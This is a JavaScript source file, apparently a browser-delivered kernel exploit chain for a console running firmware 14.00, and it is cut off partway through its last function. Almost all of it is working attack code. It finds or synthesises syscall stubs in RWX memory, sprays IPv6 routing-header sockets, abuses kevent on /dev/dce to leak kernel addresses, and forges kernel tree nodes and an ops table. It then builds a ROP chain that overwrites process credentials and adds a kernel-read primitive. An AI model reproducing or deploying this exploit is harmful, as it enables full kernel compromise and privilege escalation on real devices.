import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js?v=stage10s-1";

// ============================================================================
// hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
// Stage 2 (leak scan) — FAITHFUL port of bytecode pc 5773-6760:
//   per round: disarm all -> re-arm all (CCCC/TTTT template) -> per CANDS
//   candidate: marked() -> open("/dev/dce",O_RDWR) -> kevent(-18 plant) ->
//   scan victims for [8]==(int)page && [12]==0 -> joined==1 -> replant
//   flags=2 -> HELD. kevent(-23) is one-time setup AFTER this (pc 9108),
//   NOT per attempt. dce = the /dev/dce FD; page=((dce&0xffff)<<16)|0x985a.
// v5: x86-64 stub fix — Orbis stubs are 48 c7 c0 <imm32> 49 89 ca 0f 05 c3
//     (mov rax,num; mov r10,rcx; syscall; ret), 16-aligned. Rescan finds
//     open=5 in libkernel; jitshm RWX synth kept as last fallback.
// ============================================================================

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  read: 3, write: 4, close: 6, open: 5, getuid: 24,
  socket: 97, socketpair: 135,
  setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343;      // template magic at +8 (bytecode ldc 0x43434343)
const TPL_HI = 0x54545454;      // template magic at +12
const DEV_DCE = "/dev/dce";     // opened O_RDWR per candidate (bytecode l137)
const OPS_OFF = 0x985a;         // bytecode: ((dce&0xffff)<<16)|0x985a
// CANDS = candidate fd indices into sprayed array (Hx1400.CANDS; values
// confirmed from clinit: idx20-29 = 232,8,16,48,80,112,144,176,208,240)
const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];

const STATE = { ctx: null, kbase: 0n, kva: -1n };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

// ---------- arena ----------
const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

// --- stub resolution: stage-1 map -> x86 rescan of libkernel -> jitshm synth ---
// Orbis x86-64 syscall stub (same pattern as jb.js stage-1):
//   bytes[0..2]  = 48 c7 c0            mov rax, imm32
//   bytes[3..6]  = imm32 = syscall num (little-endian)
//   byte[7]      = 49                  REX (mov r10, rcx follows)
//   stubs are 16-byte aligned (jb.js scans with o += 16)
let SCAN_SEEN = 0;
function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  const LIMIT = 0x80000; // 512KB
  for (let o = 0; o < LIMIT; o += 16) {
    const lo = p.read4(toI64(base + BigInt(o))) >>> 0;
    if ((lo & 0x00ffffff) !== 0x00c0c748) continue;   // 48 c7 c0
    const hi = p.read4(toI64(base + BigInt(o) + 4n)) >>> 0;
    if ((hi >>> 24) !== 0x49) continue;               // byte7 == 0x49
    const n = ((lo >>> 24) | ((hi & 0x00ffffff) << 8)) >>> 0;
    SCAN_SEEN++;
    if (n === snum) return base + BigInt(o);
  }
  return null;
}

// Last-resort fallback: copy donor stub into RWX jitshm memory, patch imm32.
function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;
  const w0 = p.read4(toI64(daddr)) >>> 0;
  const w1 = p.read4(toI64(daddr + 4n)) >>> 0;
  if ((w0 & 0x00ffffff) !== 0x00c0c748 || (w1 >>> 24) !== 0x49)
    return { err: "donor " + donorNum + " ins=0x" + w1.toString(16).padStart(8, "0") + w0.toString(16).padStart(8, "0") + " not stub" };
  const imm = ((w0 >>> 24) | ((w1 & 0x00ffffff) << 8)) >>> 0;
  if (imm !== donorNum) return { err: "donor imm=" + imm + " != " + donorNum };
  let jfd = scn("jitshm_create", 0, 16384, 7);
  let usedName = false;
  if (jfd < 0) {
    const nb = allocBuf(32);
    zeroBuf(nb);
    jfd = scn("jitshm_create", nb.addr, 16384, 7);
    usedName = true;
  }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0); // MAP_SHARED
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
  if (typeof p.write4 !== "function") return { err: "p.write4 missing" };
  const nlo = ((w0 & 0x00ffffff) | ((targetNum & 0xff) << 24)) >>> 0;
  const nhi = ((w1 & 0xff000000) | ((targetNum >>> 8) & 0x00ffffff)) >>> 0;
  p.write4(toI64(addr), nlo);
  p.write4(toI64(addr + 4n), nhi);
  p.write4(toI64(addr + 8n), p.read4(toI64(daddr + 8n)) >>> 0);
  p.write4(toI64(addr + 12n), p.read4(toI64(daddr + 12n)) >>> 0);
  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum +
      " imm=" + imm + "->" + targetNum + " jfd=" + jfd + (usedName ? "(namebuf)" : "") +
      " rwx=" + h16(addr));
  return { addr };
}

function ensureStubs() {
  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const addr = findStubRaw(NUM[k]);
    if (addr !== null) {
      ctx().stubAddr.set(NUM[k], toI64(addr));
      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
    }
  }
  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB (x86 pattern)");
  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const r = synthStub(NUM[k]);
    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
    else log("SYNTH-FAIL", k + ": " + r.err);
  }
  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  if (still.length)
    fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" ") + " (rescan+synth failed)");
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}

function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

// ---------- stage-2 primitives (bytecode-exact) ----------
function buildTemplate() {
  const tpl = allocBuf(512);
  zeroBuf(tpl);
  tpl.dv.setUint8(1, 30);          // ip6r_len: (30+1)*8 = 248
  tpl.dv.setUint8(3, 15);          // ip6r_segleft = 15
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
    tpl.dv.setUint32(off, TPL_LO, true);
    tpl.dv.setUint32(off + 4, TPL_HI, true);
  }
  return tpl;
}

function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }

// marked(): getsockopt rc==0 && len==248 && +8==CCCC && +12==TTTT  (still armed)
function marked(fd, rdb, lenp) {
  zeroBuf(rdb);
  lenp.dv.setUint32(0, RTH_LEN, true);
  lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO &&
         (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}

function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    fds.push(fd);
  }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) {
    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  }
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

// ---------- stage 2: leak scan (probe() pc 5773-6760, faithful) ----------
function phase2Leak(rootKq, fds) {
  const rdb = allocBuf(512);
  const lenp = allocBuf(8);
  const cl = allocBuf(64);
  const tpl = buildTemplate();
  const dev = allocBuf(32);
  zeroBuf(dev);
  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));

  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n;
  let tries = 0;

  for (let attempt = 1; attempt <= 6; attempt++) {
    if (target >= 0 || tries >= 32) break;
    log("KV-ATTEMPT", attempt + "/6");
    for (const fd of fds) disarm(fd);
    for (const fd of fds) rearm(fd, tpl);
    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);

    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 32; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      const fd = fds[vi];
      if (!marked(fd, rdb, lenp)) continue;                 // must still be armed
      if (disarm(fd) !== 0) continue;
      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);     // open("/dev/dce",O_RDWR)
      if (dce < 0) { rearm(fd, tpl); continue; }
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;       // (int)page
      tries++;

      // plant #1: {ident=(int)dce, filter=-18, flags=1, +16=90}
      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true);
      cl.dv.setInt16(8, -18, true);
      cl.dv.setInt16(10, 1, true);
      cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
      if (rc !== 0) continue;

      // sweep all other victims
      let joined = 0;
      for (let j = 0; j < fds.length; j++) {
        if (j === vi) continue;
        zeroBuf(rdb);
        lenp.dv.setUint32(0, RTH_LEN, true);
        lenp.dv.setUint32(4, 0, true);
        if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
        const v8 = rdb.dv.getInt32(8, true);
        const v12 = rdb.dv.getUint32(12, true) >>> 0;
        if (v8 === pageInt && v12 === 0) {
          joined++;
          if (target < 0) { target = j; targetFd = fds[j]; }
          log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
          // still armed — leave it
        } else {
          rearm(fds[j], tpl);
        }
      }

      if (target >= 0 && joined === 1) {
        // plant #2 (HELD): flags=2, no +16 write
        zeroBuf(cl);
        cl.dv.setUint32(0, dce >>> 0, true);
        cl.dv.setInt16(8, -18, true);
        cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else {
          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi +
              " dce=" + dce + " target=" + target + " page=" + h16(page));
        }
      }
    }
  }

  if (kva === -1n)
    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — see KV-PLANT lines");
  STATE.kva = kva;
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
  return { kva, page: pageVal, dce: Number(kva), target, targetFd,
    round: savedRound, cand: candIdx };
}

// Hx1400.probe bytecode 6900-7992: build the mapped D object, re-register
// filter -18 with data=0, and inspect its tree field after IPv4 option 72.
// This stage deliberately stops at the first canonical pointer readback.
function stage3Leak(held, rootKq, fds, anchorFd, victims) {
  const fake = ((BigInt(held.dce) & 0xffffn) << 16n) | 0x9800n;
  const mapPage = fake & ~0x3fffn;
  const mapped = scn64("mmap", mapPage, 16384, 3, 4114, -1, 0);
  const mappedAddr = (BigInt(mapped.hi >>> 0) << 32n) | BigInt(mapped.lo >>> 0);
  log("D-FAKE-MAP", "fake=" + h16(fake) + " page=" + h16(mapPage) +
    " mapped=" + h16(mappedAddr));
  if (mappedAddr !== mapPage) fin("D fixed mmap returned " + h16(mappedAddr));

  const kptr = (value) => value !== 0n && (value >> 48n) === 0xffffn;
  const mreqA = allocBuf(16), mreqB = allocBuf(16), trigger = allocBuf(16);
  // Class locals 139, 141, and 143 at bytecode 3009-3171.
  new Uint8Array(mreqA.ab).set([0xef, 0xff, 0xff, 0xfa]);
  new Uint8Array(mreqB.ab).set([0xef, 0xff, 0xff, 0xf9]);
  new Uint8Array(trigger.ab).set([0xef, 0xff, 0xff, 0xf9, 0xc0, 0x00, 0x02, 0x01]);
  const setIp = (fd, code, buf, length) =>
    scn("setsockopt", fd, 0, code, buf.addr, length, 0);

  const anchor1 = setIp(anchorFd, 12, mreqA, 8);
  const anchor2 = setIp(anchorFd, 12, mreqB, 8);
  log("D-ANCHOR", "fd=" + anchorFd + " opt12=" + anchor1 + "," + anchor2);
  if (anchor1 !== 0 || anchor2 !== 0) fin("D anchor join");
  const freeRc = disarm(held.targetFd);
  log("D-TARGET-FREE", "index=" + held.target + " fd=" + held.targetFd + " rc=" + freeRc);
  if (freeRc !== 0) fin("D target free");
  let joined = 0;
  for (const fd of victims) {
    if (setIp(fd, 12, mreqA, 8) === 0 && setIp(fd, 12, mreqB, 8) === 0) joined++;
  }
  log("D-JOINED", "joined=" + joined + " expected=" + victims.length);
  if (joined !== victims.length) fin("D joined " + joined);

  // The browser primitive's aim guard rejects this low fixed mapping. Move
  // bytes into and out of it with native read/write over an AF_UNIX pair.
  const pair = allocBuf(8);
  zeroBuf(pair);
  const pairRc = scn("socketpair", 1, SOCK_STREAM, 0, pair.addr, 0, 0);
  if (pairRc !== 0) fin("D socketpair rc=" + pairRc + " errno=" + ctx().errno());
  const txFd = pair.dv.getInt32(0, true), rxFd = pair.dv.getInt32(4, true);
  if (txFd < 3 || rxFd < 3) fin("D socketpair fds=" + txFd + "," + rxFd);
  const writeAll = (fd, addr, length) => {
    let done = 0;
    while (done < length) {
      const rc = scn("write", fd, addr + BigInt(done), length - done, 0, 0, 0);
      if (rc <= 0) fin("D native write fd=" + fd + " done=" + done + " rc=" + rc);
      done += rc;
    }
  };
  const readAll = (fd, addr, length) => {
    let done = 0;
    while (done < length) {
      const rc = scn("read", fd, addr + BigInt(done), length - done, 0, 0, 0);
      if (rc <= 0) fin("D native read fd=" + fd + " done=" + done + " rc=" + rc);
      done += rc;
    }
  };
  const fakeImage = allocBuf(4096);
  zeroBuf(fakeImage);
  const w64 = (off, value) => {
    const v = BigInt(value);
    fakeImage.dv.setUint32(off, Number(v & 0xffffffffn), true);
    fakeImage.dv.setUint32(off + 4, Number((v >> 32n) & 0xffffffffn), true);
  };
  fakeImage.dv.setUint32(16, 0xf9ffffef, true);
  w64(24, fake + 512n);
  fakeImage.dv.setUint32(640, 8, true);
  w64(32, fake + 768n);
  w64(800, fake + 1024n);
  w64(1880, fake + 2048n);
  w64(2056, fake + 2304n);
  fakeImage.dv.setUint32(56, 2, true);
  w64(80, 0n);
  w64(88, 0n);
  fakeImage.dv.setUint16(180, 2, true);
  fakeImage.dv.setUint16(190, 2, true);
  writeAll(txFd, fakeImage.addr, fakeImage.ab.byteLength);
  readAll(rxFd, fake, fakeImage.ab.byteLength);
  const verify = allocBuf(4);
  writeAll(rxFd, fake + 16n, 4);
  readAll(txFd, verify.addr, 4);
  const verifyWord = verify.dv.getUint32(0, true);
  log("D-FAKE-VERIFY", "word16=" + h16(verifyWord));
  if (verifyWord !== 0xf9ffffef) fin("D fake copy mismatch");
  log("D-FAKE-READY", "fake=" + h16(fake) + " bytes=" + fakeImage.ab.byteLength +
    " pair=" + txFd + "," + rxFd);

  const cl = allocBuf(64);
  zeroBuf(cl);
  cl.dv.setUint32(0, held.dce >>> 0, true);
  cl.dv.setInt16(8, -18, true);
  cl.dv.setInt16(10, 1, true);
  cl.dv.setUint32(16, 0, true);
  const before = "dce=" + held.dce + " kq=" + rootKq + " target=" + held.target +
    " fake=" + h16(fake) + " filter=-18 flags=1 data=0";
  if (ctx().markSync) ctx().markSync("D-EVADD-BEFORE", before);
  else log("D-EVADD-BEFORE", before);
  const addRc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
  log("D-EVADD-AFTER", "rc=" + addRc);
  if (addRc !== 0) fin("D leak ev-add rc=" + addRc);

  const readback = allocBuf(48);
  const value64 = (off) => BigInt(readback.dv.getUint32(off, true)) |
    (BigInt(readback.dv.getUint32(off + 4, true)) << 32n);
  let victim = -1, tree = 0n, count = 0n, mutated = 0, noncanonical = 0;
  for (let i = 0; i < victims.length; i++) {
    setIp(victims[i], 72, trigger, 12);
    writeAll(rxFd, fake + 48n, readback.ab.byteLength);
    readAll(txFd, readback.addr, readback.ab.byteLength);
    const value = value64(32);
    count = value64(40);
    if (readback.dv.getUint32(8, true) !== 2) { mutated++; continue; }
    if (kptr(value)) { victim = i; tree = value; break; }
    if (value !== 0n) noncanonical++;
  }
  log("D-TREE", "victim=" + victim + " tree=" + h16(tree) +
    " count=" + h16(count) + " mutated=" + mutated +
    " noncanonical=" + noncanonical);
  if (victim < 0) fin("D no kva");
  const copyIn = (addr, buf, length) => {
    writeAll(txFd, buf.addr, length);
    readAll(rxFd, addr, length);
  };
  const copyOut = (addr, buf, length) => {
    writeAll(rxFd, addr, length);
    readAll(txFd, buf.addr, length);
  };
  return { victim, victimFd: victims[victim], tree, fake, mapPage,
    trigger, setIp, copyIn, copyOut };
}

// Hx1400.probe bytecode 7993-8327: the first three-node rotation gadget.
function stage4Gadget(d) {
  const a = d.fake + 2560n, b = d.fake + 2688n, c = d.fake + 2816n;
  const node = allocBuf(48);
  const put64 = (dv, off, value) => {
    const v = BigInt(value);
    dv.setUint32(off, Number(v & 0xffffffffn), true);
    dv.setUint32(off + 4, Number((v >> 32n) & 0xffffffffn), true);
  };
  const makeNode = (addr, right, left, parent, color, key) => {
    zeroBuf(node);
    put64(node.dv, 0, right);
    put64(node.dv, 8, left);
    put64(node.dv, 16, parent);
    node.dv.setUint32(24, color, true);
    node.dv.setInt32(32, key, true);
    node.dv.setUint8(36, 1);
    node.dv.setUint8(37, 1);
    d.copyIn(addr, node, node.ab.byteLength);
  };
  makeNode(a, b, 0n, 0n, 0, -1);
  makeNode(b, 0n, c, a, 1, -2);
  makeNode(c, 0n, 0n, b, 0, -3);
  const root = allocBuf(16);
  zeroBuf(root);
  put64(root.dv, 0, a);
  put64(root.dv, 8, 3n);
  d.copyIn(d.fake + 80n, root, root.ab.byteLength);
  d.trigger.dv.setUint8(7, 2);
  const before = "fd=" + d.victimFd + " A=" + h16(a) + " B=" + h16(b) +
    " C=" + h16(c) + " opt=72";
  if (ctx().markSync) ctx().markSync("E-GADGET-BEFORE", before);
  else log("E-GADGET-BEFORE", before);
  const rc = d.setIp(d.victimFd, 72, d.trigger, 12);
  const qword = allocBuf(8);
  const read64 = (addr) => {
    d.copyOut(addr, qword, 8);
    return BigInt(qword.dv.getUint32(0, true)) |
      (BigInt(qword.dv.getUint32(4, true)) << 32n);
  };
  const parent = read64(c + 16n);
  const newRoot = read64(d.fake + 80n);
  const link = read64(b);
  const ok = rc === 0 && parent === a && newRoot === b &&
    link !== 0n && (link >> 48n) === 0xffffn;
  log("E-GADGET", "rc=" + rc + " parent=" + h16(parent) +
    " want=" + h16(a) + " root=" + h16(newRoot) +
    " link=" + h16(link) + " ok=" + ok);
  if (!ok) fin("E rotation gadget gate");
  return { root: newRoot, link, makeNode, put64, read64 };
}

// Hx1400.probe bytecode 8328-8963: rotate through R_SLOT and build fake ops.
function stage5Rotate(d, e) {
  const slot = ka(P[13]), ops = ka(P[14]);
  const a = d.fake + 2304n, b = d.fake + 3072n, c = d.fake + 3328n;
  e.makeNode(a, b, c, slot - 8n, 0, -1);
  e.makeNode(b, 0n, 0n, a, 1, -2);
  e.makeNode(c, 0n, 0n, 0n, 0, -3);
  const root = allocBuf(16);
  zeroBuf(root);
  e.put64(root.dv, 0, a);
  e.put64(root.dv, 8, 3n);
  d.copyIn(d.fake + 80n, root, root.ab.byteLength);
  d.trigger.dv.setUint8(7, 3);
  const before = "fd=" + d.victimFd + " slot=" + h16(slot) +
    " ops=" + h16(ops) + " A=" + h16(a) + " B=" + h16(b) +
    " C=" + h16(c) + " opt=72";
  if (ctx().markSync) ctx().markSync("F-ROTATE-BEFORE", before);
  else log("F-ROTATE-BEFORE", before);
  const rc = d.setIp(d.victimFd, 72, d.trigger, 12);
  const newRoot = e.read64(d.fake + 80n);
  const count = e.read64(d.fake + 88n);
  const aRight = e.read64(a);
  const aLeft = e.read64(a + 8n);
  const aParent = e.read64(a + 16n);
  const bRight = e.read64(b);
  const bLeft = e.read64(b + 8n);
  const cParent = e.read64(c + 16n);
  const ok = rc === 0 && newRoot === a && count === 4n &&
    aRight === 0n && aLeft === c && aParent === b &&
    bLeft === a && cParent === 0n && bRight !== 0n &&
    (bRight >> 48n) === 0xffffn;
  log("F-ROTATE", "rc=" + rc + " root=" + h16(newRoot) +
    " count=" + h16(count) + " A0=" + h16(aRight) +
    " A8=" + h16(aLeft) + " A16=" + h16(aParent) +
    " B0=" + h16(bRight) + " B8=" + h16(bLeft) +
    " C16=" + h16(cParent) + " ok=" + ok);
  if (!ok) fin("F slot rotation gate");

  const ret0 = ka(P[15]), touch = ka(P[16]);
  const fakeOps = allocBuf(40);
  zeroBuf(fakeOps);
  e.put64(fakeOps.dv, 0, 0n);
  e.put64(fakeOps.dv, 8, ret0);
  e.put64(fakeOps.dv, 16, ret0);
  e.put64(fakeOps.dv, 24, ret0);
  e.put64(fakeOps.dv, 32, touch);
  d.copyIn(b, fakeOps, fakeOps.ab.byteLength);
  const check = allocBuf(40);
  d.copyOut(b, check, check.ab.byteLength);
  const qword = (off) => BigInt(check.dv.getUint32(off, true)) |
    (BigInt(check.dv.getUint32(off + 4, true)) << 32n);
  const opsOk = qword(0) === 0n && qword(8) === ret0 &&
    qword(32) === touch;
  log("F-FAKEOPS", "addr=" + h16(b) + " isfd=" + h16(qword(0)) +
    " attach=" + h16(qword(8)) + " touch=" + h16(qword(32)) +
    " ok=" + opsOk);
  if (!opsOk) fin("F fakeOps readback");
  return { slot, ops, fakeOps: b, ret0, touch };
}

// Hx1400.probe 8966-9659 plus safeDown: register one -23 knote, optionally
// run the bytecode credential chain, restore R_OPS, and delete the knote.
function stage6Bridge(d, f, credential, guardScan, applyPatch) {
  const gStack = d.fake + 4096n;
  const gCtx = d.fake + 5888n;
  const gMark = d.fake + 5760n;
  const gIdent = 0x31344b5052544f4fn;
  const marker = 0x4d4d524f4f544a31n;
  const uidBefore = credential ? scn("getuid") : null;
  const put64 = (dv, off, value) => {
    const v = BigInt(value);
    dv.setUint32(off, Number(v & 0xffffffffn), true);
    dv.setUint32(off + 4, Number((v >> 32n) & 0xffffffffn), true);
  };
  const get64 = (dv, off) => BigInt(dv.getUint32(off, true)) |
    (BigInt(dv.getUint32(off + 4, true)) << 32n);
  const event = allocBuf(64);
  const rootKq = scn("kqueue");
  if (rootKq < 3) fin("G root kqueue rc=" + rootKq);
  zeroBuf(event);
  put64(event.dv, 0, gIdent);
  event.dv.setInt16(8, -23, true);
  event.dv.setInt16(10, 1, true);
  const before = "kq=" + rootKq + " ident=" + h16(gIdent) +
    " slot=" + h16(f.slot) + " fakeOps=" + h16(f.fakeOps);
  if (ctx().markSync) ctx().markSync("G-ARM-BEFORE", before);
  else log("G-ARM-BEFORE", before);
  const armRc = scn("kevent", rootKq, event.addr, 1, 0, 0, 0);
  log("G-ARM-AFTER", "rc=" + armRc);
  if (armRc !== 0) fin("G initial EV_ADD -23 rc=" + armRc);

  const zero = allocBuf(96);
  zeroBuf(zero);
  const pin = allocBuf(40);
  zeroBuf(pin);
  pin.dv.setUint32(0, 0x40000000, true);
  d.copyIn(d.fake + 56n, pin, 4);
  d.copyIn(d.fake + 80n, zero, 16);
  d.copyIn(d.fake + 2304n, zero, 96);
  d.copyIn(d.fake + 2560n, zero, 96);
  put64(pin.dv, 0, f.touch);
  d.copyIn(f.fakeOps + 32n, pin, 8);
  const opsCheck = allocBuf(40);
  d.copyOut(f.fakeOps, opsCheck, 40);
  if (get64(opsCheck.dv, 8) !== f.ret0 ||
      get64(opsCheck.dv, 32) !== f.touch)
    fin("G fakeOps changed before restore");
  put64(pin.dv, 0, 0n);
  d.copyIn(gMark, pin, 8);
  const stackWords = [ka(P[23]), gCtx, ka(P[18])]; // kb0
  if (credential) {
    // probe pc 9285-9456: UID pair and three ucred qword writes.
    stackWords.push(ka(P[24]), 0n, ka(P[21]), 0x100000000n,
      ka(P[22]), 0n, ka(P[30]), 0n);
    const credWrite = (offset, value) => stackWords.push(
      ka(P[24]), 0n, ka(P[25]), 0n, ka(P[22]), BigInt(offset),
      ka(P[27]), 0n, ka(P[22]), BigInt(value), ka(P[28]), 0n);
    credWrite(88, 0x4801000000000013n);
    credWrite(96, -1n);
    credWrite(104, -1n);
  }
  if (!guardScan) stackWords.push(
    ka(P[21]), f.slot, ka(P[22]), f.ops, ka(P[28]), 0n);
  const kb1 = [
    ka(P[21]), marker, ka(P[23]), gMark, ka(P[29]), 0n,
    ka(P[21]), gCtx + 16n, ka(P[26]), 0n,
    ka(P[22]), -120n, ka(P[27]), 0n,
    ka(P[23]), gCtx + 8n, ka(P[29]), 0n,
    ka(P[21]), ka(P[20]), ka(P[23]), gCtx + 56n, ka(P[29]), 0n,
    ka(P[23]), gCtx, ka(P[19])];                  // bytecode kb1
  stackWords.push(...kb1);
  if (stackWords.length > 112) fin("G stack exceeds kgo cap");
  const stack = allocBuf(stackWords.length * 8);
  zeroBuf(stack);
  for (let i = 0; i < stackWords.length; i++) put64(stack.dv, i * 8, stackWords[i]);
  d.copyIn(gStack, stack, stack.ab.byteLength);
  log(guardScan ? "G-CRED-STACK" : "G-RESTORE-STACK", "words=" + stackWords.length +
    " credential=" + credential + " guardScan=" + guardScan + " at=" + h16(gStack) +
    " slot=" + h16(f.slot) + " ops=" + h16(f.ops));

  zeroBuf(event);
  put64(event.dv, 0, gIdent);
  event.dv.setInt16(8, -23, true);
  event.dv.setInt16(10, 1, true);
  put64(event.dv, 32, ka(P[17]));
  put64(event.dv, 40, gStack);
  const fire = "kq=" + rootKq + " nchanges=2 popRSP=" + h16(ka(P[17])) +
    " stack=" + h16(gStack);
  if (ctx().markSync) ctx().markSync(guardScan ? "G-CRED-BEFORE" : "G-RESTORE-BEFORE", fire);
  else log(guardScan ? "G-CRED-BEFORE" : "G-RESTORE-BEFORE", fire);
  const fireRc = scn("kevent", rootKq, event.addr, 2, 0, 0, 0);
  const markRead = allocBuf(8);
  d.copyOut(gMark, markRead, 8);
  const observed = get64(markRead.dv, 0);
  const restored = observed === marker;
  log(guardScan ? "G-CRED-AFTER" : "G-RESTORE-AFTER", "rc=" + fireRc + " marker=" + h16(observed) +
    " want=" + h16(marker) + " restored=" + restored);
  if (!restored) fin("G restore marker missing");
  const uidAfter = credential ? scn("getuid") : null;
  if (credential) log("H-UID", "before=" + uidBefore + " after=" + uidAfter +
    " marker=" + restored);

  let guards = null, patchResult = null;
  if (guardScan) {
    // Bytecode kread/kbytes: retain the hooked knote for repeated ROP reads.
    const gRes = d.fake + 5632n;
    const resultBuf = allocBuf(8);
    const zeroQ = allocBuf(8);
    zeroBuf(zeroQ);
    const runRead = (address) => {
      const words = [ka(P[23]), gCtx, ka(P[18]),
        ka(P[21]), address, ka(P[26]), 0n,
        ka(P[23]), gRes, ka(P[29]), 0n, ...kb1];
      if (words.length > 112) throw new Error("kread stack cap");
      const buf = allocBuf(words.length * 8);
      zeroBuf(buf);
      for (let i = 0; i < words.length; i++) put64(buf.dv, i * 8, words[i]);
      d.copyIn(gStack, buf, buf.ab.byteLength);
      d.copyIn(gRes, zeroQ, 8);
      d.copyIn(gMark, zeroQ, 8);
      const rc = scn("kevent", rootKq, event.addr, 2, 0, 0, 0);
      d.copyOut(gMark, resultBuf, 8);
      if (get64(resultBuf.dv, 0) !== marker)
